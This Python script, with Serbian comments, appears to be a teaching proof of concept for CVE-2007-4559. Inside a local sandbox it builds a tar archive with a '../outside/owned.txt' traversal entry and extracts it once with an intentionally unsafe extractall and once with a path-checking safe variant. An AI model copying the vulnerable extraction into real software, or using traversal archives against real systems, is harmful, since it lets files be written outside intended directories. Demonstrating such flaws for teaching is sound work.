from __future__ import annotations

import shutil
import tarfile
import warnings
from pathlib import Path


# Radimo sve unutar lokalnog demo direktorijuma kako bi prikaz bio bezbedan
# i kako ne bismo menjali bilo sta van studentskog foldera.
BASE_DIR = Path(__file__).resolve().parent
SANDBOX_DIR = BASE_DIR / "sandbox"
ARCHIVE_PATH = SANDBOX_DIR / "malicious_payload.tar"
VULNERABLE_DIR = SANDBOX_DIR / "vulnerable_extract"
SAFE_DIR = SANDBOX_DIR / "safe_extract"
OUTSIDE_DIR = SANDBOX_DIR / "outside"
TARGET_FILENAME = "owned.txt"


def reset_environment() -> None:
    """Brise stari demo sadrzaj i pravi cistu strukturu direktorijuma."""
    if SANDBOX_DIR.exists():
        shutil.rmtree(SANDBOX_DIR)

    VULNERABLE_DIR.mkdir(parents=True, exist_ok=True)
    SAFE_DIR.mkdir(parents=True, exist_ok=True)
    OUTSIDE_DIR.mkdir(parents=True, exist_ok=True)


def create_malicious_archive() -> None:
    """
    Pravi tar arhivu sa path traversal unosom.

    Fajl '../outside/owned.txt' simulira napad kod CVE-2007-4559:
    prilikom nebezbedne ekstrakcije izlazi se iz ciljnog direktorijuma.
    """
    payload_source = SANDBOX_DIR / "payload.txt"
    payload_source.write_text(
        "Ovaj fajl je upisan preko path traversal unosa u tar arhivi.\n",
        encoding="utf-8",
    )

    with tarfile.open(ARCHIVE_PATH, "w") as archive:
        archive.add(payload_source, arcname="../outside/owned.txt")


def vulnerable_extract(archive_path: Path, destination: Path) -> None:
    """
    Namerno nebezbedan primer.

    Koristi standardni extractall bez provere putanja, sto je sustina problema
    kod CVE-2007-4559 kada aplikacija veruje sadrzaju tar arhive.
    """
    with tarfile.open(archive_path, "r") as archive:
        # Namerno zadrzavamo staro ponasanje radi demonstracije ranjivosti,
        # ali potiskujemo upozorenje da izlaz ostane pregledan.
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", DeprecationWarning)
            archive.extractall(destination)


def is_within_directory(base: Path, candidate: Path) -> bool:
    """Proverava da li kandidovana putanja ostaje unutar baze."""
    try:
        candidate.resolve().relative_to(base.resolve())
        return True
    except ValueError:
        return False


def safe_extract(archive_path: Path, destination: Path) -> None:
    """
    Bezbedna varijanta ekstrakcije.

    Svaki clan arhive proveravamo pre raspakivanja. Ako putanja izlazi iz
    ciljnog direktorijuma, prekidamo ekstrakciju i prijavljujemo problem.
    """
    with tarfile.open(archive_path, "r") as archive:
        members = archive.getmembers()

        for member in members:
            candidate_path = destination / member.name
            if not is_within_directory(destination, candidate_path):
                raise ValueError(
                    f"Blokiran path traversal pokusaj: {member.name}"
                )

        archive.extractall(destination, members=members)


def print_result(title: str, extracted_dir: Path) -> None:
    """Ispisuje stanje posle ekstrakcije da se efekat demo zadatka jasno vidi."""
    escaped_file = OUTSIDE_DIR / TARGET_FILENAME
    inside_files = sorted(
        path.relative_to(extracted_dir).as_posix()
        for path in extracted_dir.rglob("*")
        if path.is_file()
    )

    print(f"\n=== {title} ===")
    print(f"Direktorijum ekstrakcije: {extracted_dir}")
    print(f"Fajlovi unutar cilja: {inside_files or ['nema fajlova']}")
    print(f"Fajl van cilja postoji: {escaped_file.exists()}")

    if escaped_file.exists():
        print("Sadrzaj escape fajla:")
        print(escaped_file.read_text(encoding="utf-8").strip())


def main() -> None:
    """Pokrece kompletan lokalni proof-of-concept za Slippy/CVE-2007-4559."""
    reset_environment()
    create_malicious_archive()

    print("Pokrecem demonstraciju za CVE-2007-4559 (tarfile path traversal).")
    print(f"Arhiva za testiranje: {ARCHIVE_PATH}")

    vulnerable_extract(ARCHIVE_PATH, VULNERABLE_DIR)
    print_result("Nebezbedna ekstrakcija", VULNERABLE_DIR)

    # Cistimo escape fajl kako bi bezbedan scenario poceo iz istog stanja.
    escaped_file = OUTSIDE_DIR / TARGET_FILENAME
    if escaped_file.exists():
        escaped_file.unlink()

    try:
        safe_extract(ARCHIVE_PATH, SAFE_DIR)
    except ValueError as error:
        print(f"\n=== Bezbedna ekstrakcija ===")
        print(f"Zastita je zaustavila raspakivanje: {error}")

    print_result("Stanje nakon bezbednog pokusaja", SAFE_DIR)


if __name__ == "__main__":
    main()
